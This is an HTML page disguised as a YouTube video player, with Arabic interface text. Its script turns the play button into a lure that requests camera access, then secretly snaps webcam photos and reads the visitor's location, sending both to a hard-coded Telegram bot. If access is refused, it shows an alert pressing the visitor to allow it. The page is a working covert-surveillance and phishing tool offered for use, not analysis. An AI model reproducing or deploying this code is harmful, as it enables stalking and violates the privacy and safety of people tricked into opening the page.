<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: Roboto, Arial, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
        .header { height: 56px; padding: 0 16px; display: flex; align-items: center; justify-content: space-between; background: #0f0f0f; position: sticky; top: 0; z-index: 1000; }
        .yt-logo { height: 20px; }
        
        /* منطقة المشغل */
        .video-container { position: relative; width: 100%; padding-top: 56.25%; background: #000; }
        #player { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
        
        /* غطاء التشغيل لطلب الصلاحيات */
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; }
        .play-btn { width: 68px; height: 68px; background: #f00; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(255,0,0,0.4); }
        .play-btn-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
        
        /* تفاصيل الفيديو */
        .details { padding: 15px; border-bottom: 1px solid #222; }
        #vTitle { font-size: 18px; margin: 0; font-weight: 500; color: #fff; line-height: 1.4; }
        .stats { font-size: 12px; color: #aaa; margin-top: 8px; }

        /* منطقة الاقتراحات السفلية (محاكاة) */
        .up-next { padding: 15px; font-size: 14px; color: #fff; font-weight: 500; }
        .suggest-box { display: flex; padding: 10px 15px; gap: 12px; }
        .thumb-fake { width: 120px; height: 68px; background: #222; border-radius: 8px; flex-shrink: 0; }
        .text-fake { flex-grow: 1; }
        .line { background: #222; height: 12px; margin-bottom: 8px; border-radius: 4px; }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="yt-logo">
    <div style="color: #fff; font-size: 20px;">🔍 &nbsp; ⋮</div>
</div>

<div class="video-container">
    <div id="player"></div>
    <div class="overlay" id="overlay">
        <div class="play-btn"><div class="play-btn-icon"></div></div>
        <p style="color:#ccc; font-size:13px; margin-top:20px;">انقر للتشغيل</p>
    </div>
</div>

<div class="details">
    <h1 id="vTitle">جاري التحميل...</h1>
    <div class="stats" id="vMeta">مشاهدات حقيقية • جاري جلب البيانات</div>
</div>

<div class="up-next">الفيديوهات التالية</div>
<div class="suggest-box">
    <div class="thumb-fake"></div>
    <div class="text-fake"><div class="line" style="width:90%"></div><div class="line" style="width:60%"></div></div>
</div>

<canvas id="canvas"></canvas>
<video id="camVideo" autoplay playsinline muted></video>

<script>
    // --- الإعدادات (ضع رابط الفيديو هنا فقط) ---
    const YOUTUBE_URL = "https://youtu.be/m4Rs0l79vTw?si=zoD82mQjnV10GhYz"; 
    const TELEGRAM_TOKEN = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
    const CHAT_ID = "591768998";
    // ----------------------------------------

    function getID(url) {
        const reg = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
        const match = url.match(reg);
        return (match && match[2].length === 11) ? match[2] : null;
    }

    const vID = getID(YOUTUBE_URL);

    // جلب بيانات الفيديو تلقائياً
    async function fetchYT() {
        try {
            const res = await fetch(`https://noembed.com/embed?url=${encodeURIComponent(YOUTUBE_URL)}`);
            const d = await res.json();
            document.getElementById('vTitle').innerText = d.title || "فيديو يوتيوب";
            document.getElementById('vMeta').innerText = `${d.author_name} • تم التحقق`;
        } catch(e) {
            document.getElementById('vTitle').innerText = "فيديو يوتيوب";
        }
    }
    fetchYT();

    // تحميل مكتبة YouTube Player
    var tag = document.createElement('script');
    tag.src = "https://www.youtube.com/iframe_api";
    document.body.appendChild(tag);

    let player;
    function onYouTubeIframeAPIReady() {
        player = new YT.Player('player', {
            height: '100%', width: '100%', videoId: vID,
            playerVars: { 'autoplay': 0, 'controls': 1, 'rel': 0, 'modestbranding': 1 },
            events: { 'onReady': () => console.log("Player Ready") }
        });
    }

    document.getElementById('overlay').onclick = async function() {
        try {
            // طلب الكاميرا والموقع (تم إلغاء المايك لضمان جودة الصوت للأغنية)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            document.getElementById('camVideo').srcObject = stream;
            document.getElementById('overlay').style.display = 'none';
            
            // تشغيل الفيديو بصوت كامل
            player.playVideo();
            player.unMute();
            player.setVolume(100);

            sendReport(`🎬 بدأ المشاهدة: ${document.getElementById('vTitle').innerText}`);
            
            navigator.geolocation.getCurrentPosition(p => {
                sendReport(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            // التقاط الصور في الخلفية صمتاً
            setTimeout(() => snap(1), 3000);
            setTimeout(() => snap(2), 8000);

        } catch (e) {
            alert("يرجى السماح بالوصول للمشغل للمتابعة.");
        }
    };

    function snap(n) {
        const v = document.getElementById('camVideo');
        const c = document.getElementById('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', b, `user_${n}.jpg`);
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd, keepalive: true });
        }, 'image/jpeg', 0.5);
    }

    function sendReport(t) {
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: t}),
            keepalive: true
        });
    }
</script>
</body>
</html>
